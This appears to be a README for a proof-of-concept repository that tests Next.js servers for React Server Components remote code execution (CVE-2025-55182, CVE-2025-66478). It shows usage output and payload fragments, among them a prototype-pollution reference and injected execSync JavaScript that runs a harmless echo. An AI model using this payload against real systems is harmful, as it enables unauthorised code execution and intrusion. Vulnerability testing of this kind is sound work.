# Next.js RCE PoC

A minimal vulnerable app and Python proof-of-concept for **CVE-2025-55182** and **CVE-2025-66478** - Remote Code Execution vulnerabilities in Next.js React Server Components.

## Usage

```bash
docker build -t nextjs-poc .
docker run -p 3000:3000 nextjs-poc
pip install requests
python poc.py http://localhost:3000
[*] Targeting: http://localhost:3000/
[*] Payload command: echo $((1330+7))
[*] Status: 303
[+] VULNERABLE! RCE confirmed.
[+] X-Action-Redirect: /login?a=1337;push
```

## How it works

### 1. Crafts a malicious multipart POST request

The script builds a multipart form-data request with three parts (`0`, `1`, `2`) that mimics a Next.js Server Action call. The `Next-Action: x` header tells Next.js to process this as a Server Action.

### 2. Exploits prototype pollution in React Flight deserialization

The payload in part `0` contains:
```json
{"then":"$1:__proto__:then", ...}
```

When Next.js deserializes this using React Flight protocol, the `$1:__proto__:then` reference causes **prototype pollution** - it writes to the object's prototype chain instead of a normal property. This allows the attacker to control how objects behave.

### 3. Injects and executes JavaScript code

The `_response._prefix` field contains the malicious JavaScript:
```javascript
var res = process.mainModule.require('child_process').execSync('echo $((1330+7))').toString().trim();
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: `NEXT_REDIRECT;push;/login?a=${res};307;`
});
```

This code:
- Imports Node.js `child_process` module
- Executes the shell command `echo $((1330+7))` (outputs `1337`)
- Throws a fake redirect error containing the command output

### 4. Confirms RCE via response header

If vulnerable, Next.js processes the fake redirect and sets:
```
X-Action-Redirect: /login?a=1337
```

The script checks for `1337` in this header - if present, code execution is confirmed.

### Credits
https://github.com/assetnote/react2shell-scanner
